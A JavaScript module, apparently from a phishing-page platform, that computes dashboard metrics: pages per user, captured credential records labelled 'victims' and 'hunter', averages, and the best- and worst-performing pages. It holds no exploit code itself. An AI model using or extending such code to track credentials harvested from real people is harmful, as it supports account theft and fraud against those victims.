import Pages from "../model/pages.js";
import Credentials from "../model/credentials.js";

const getVictimsUtil = async (user_id) => {
  const victims = await Credentials.find({
    hunter: user_id,
  });
  return victims;
};

const getPagesUtil = async (user_id) => {
  const pages = await Pages.find({
    author: user_id,
  });
  return pages;
};

const VictimsForPageUtil = async (page_id) => {
  const victims = await Credentials.find({
    page: page_id,
  });
  return victims;
};

const maxVictimsUtil = (pagesMetrics) => {
  let maxVictims = {};
  for (const page of pagesMetrics) {
    if (!maxVictims.victims || page.victims > maxVictims.victims) {
      maxVictims = page;
    }
  }
  return maxVictims;
};

const minVictimsUtil = (pagesMetrics) => {
  let minVictims = {};
  for (const page of pagesMetrics) {
    if (!minVictims.victims || page.victims < minVictims.victims) {
      minVictims = page;
    }
  }
  return minVictims;
};
const pageMetricsUtil = async (page) => {
  const victims = await VictimsForPageUtil(page._id);
  return {
    page: page,
    victims: victims.length,
  };
};
export const getMetrics = async (user_id) => {
  const pages = await getPagesUtil(user_id);
  const victims = await getVictimsUtil(user_id);
  const numberOfPages = pages.length;
  const numberOfVictims = victims.length;
  const avgVictims = numberOfPages > 0 ? numberOfVictims / numberOfPages : 0;

  //get metrics for each page
  const pagesMetrics = [];
  for (const page of pages) {
    const pageMetrics = await pageMetricsUtil(page);
    pagesMetrics.push(pageMetrics);
  }
  const maxVictims = maxVictimsUtil(pagesMetrics);
  const minVictims = minVictimsUtil(pagesMetrics);
  const metrics = {
    numberOfPages: numberOfPages,
    numberOfVictims: numberOfVictims,
    avgVictims: avgVictims,
    maxVictims: maxVictims,
    minVictims: minVictims,
    pagesMetrics: pagesMetrics,
  };
  return metrics;
};
